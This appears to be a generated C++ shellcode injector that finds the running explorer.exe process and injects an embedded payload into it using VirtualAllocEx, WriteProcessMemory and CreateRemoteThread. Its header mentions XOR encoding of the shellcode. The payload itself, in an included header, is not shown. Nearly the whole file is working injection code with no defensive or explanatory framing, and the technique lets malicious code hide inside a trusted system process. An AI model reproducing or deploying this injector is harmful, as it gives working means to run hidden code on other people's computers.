// Generated by Build.rb from ReflectiveShellcode
// Compile using: cl.exe /EHsc DllInject.cpp

/*
	Options:
		Shellcode Encoder was disabled
		Shellcode is XOR'd with 0xf1
*/
#include <windows.h>
#include <stdio.h>
#include <psapi.h>

#pragma comment(lib, "psapi")
#pragma comment(lib, "user32")

#include "AsmCode.h"

BOOL Inject(HANDLE hProcess, BYTE *pCode, DWORD dwCodeLen)
{
	HANDLE	hThread;
	BYTE	*pRemoteMem;
	DWORD	dw;
	
	// Allocate remote memory
	pRemoteMem = (BYTE*) VirtualAllocEx(hProcess, NULL, dwCodeLen + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if(!pRemoteMem)
		return FALSE;
	
	// Write Code into Remote Process Address Space
	WriteProcessMemory(hProcess, (LPVOID) pRemoteMem, (LPVOID) pCode, dwCodeLen, &dw);
	
	// Execute Injected Code
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteMem, NULL, 0, &dw);
	if(hThread) {
		WaitForSingleObject(hThread, INFINITE);
		return TRUE;
	}
	
	VirtualFreeEx(hProcess, (LPVOID) pRemoteMem, 0, MEM_RELEASE);
	return FALSE;
}

// non-reentrant
CHAR *_ToLowerCase(char *p)
{
	static char _s_lower_str[4000];
	int i;
	
	memset(_s_lower_str, 0, sizeof(_s_lower_str));
	for(i = 0; i < strlen(p); i++)
		_s_lower_str[i] = tolower((int) p[i]);
		
	return ((char*) _s_lower_str);
}

VOID DecodeAndInject(BYTE *pCode, DWORD dwCodeLen)
{
	DWORD nProcessIDs[1024];
	DWORD nProcesses;
	DWORD cb;
	DWORD i;
	HANDLE hProcess;
	CHAR szPath[MAX_PATH + 32];
	BOOLEAN found = FALSE;
	
	/* Decode */
	//for(INT i = 0; i < dwCodeLen; i++)
	//	pCode[i] ^= 0xf1;

	/* Check running process for Explorer.Exe */
	if(EnumProcesses(nProcessIDs, sizeof(nProcessIDs), &cb)) {
		nProcesses = cb / sizeof(nProcessIDs[0]);
		for(i = 0; i < nProcesses; i++) {
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, 
				FALSE, nProcessIDs[i]);
			if(!hProcess)
				continue;

			ZeroMemory(szPath, sizeof(szPath));
			if(!GetModuleFileNameExA(hProcess, NULL, szPath, sizeof(szPath)))
				continue;
				
			//MessageBoxA(NULL, szPath, "AA", MB_OK);

			if(strstr(_ToLowerCase(szPath), "explorer.exe") != NULL) {
				if(Inject(hProcess, pCode, dwCodeLen))
					MessageBoxA(NULL, "Success", "MSG", MB_OK);
				else
					MessageBoxA(NULL, "Error Occurred", "MSG", MB_ICONERROR);
					
				found = TRUE;
			}

			CloseHandle(hProcess);
			
			if(found)
				break;
		}
	}
	
	if(!found)
		MessageBoxA(NULL, "Not Found", "MSG", MB_ICONERROR);
}

int main(int argc, char **argv)
{
	BYTE	*pCode = (BYTE*) &ASMCODE;
	DWORD	fOld;
	
	//LoadLibraryA("E:\\Projects\\HiDump\\src\\HiDMonitor\\Release\\HiDMonitor.dll");

	//_asm int 3;
	
	VirtualProtect((LPVOID) ASMCODE, sizeof(ASMCODE), PAGE_EXECUTE_READWRITE, &fOld);
	DecodeAndInject((BYTE*) ASMCODE, sizeof(ASMCODE));
	
	return 0;
}
	